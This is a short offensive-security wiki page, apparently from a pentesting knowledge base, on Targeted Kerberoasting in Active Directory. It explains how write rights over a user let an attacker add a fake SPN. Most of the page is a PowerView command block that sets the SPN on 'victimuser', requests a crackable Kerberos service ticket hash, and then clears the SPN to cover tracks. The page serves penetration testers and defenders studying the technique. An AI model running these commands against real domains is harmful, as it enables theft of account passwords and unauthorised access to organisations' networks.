# Targeted Kerberoasting

This abuse can be carried out when controlling an object that has `WriteProperty`, `GenericWrite` or `GenericAll` over a target user.

The attacker can add a SPN \(ServicePrincipalName\) to that account. Once the account has a SPN, it becomes vulnerable to [Kerberoasting](../kerberos/kerberoast.md). This technique is called Targeted Kerberoasting. This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# Make sur that the target account has no SPN
Get-DomainUser 'victimuser' | Select serviceprincipalname

# Set the SPN
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.

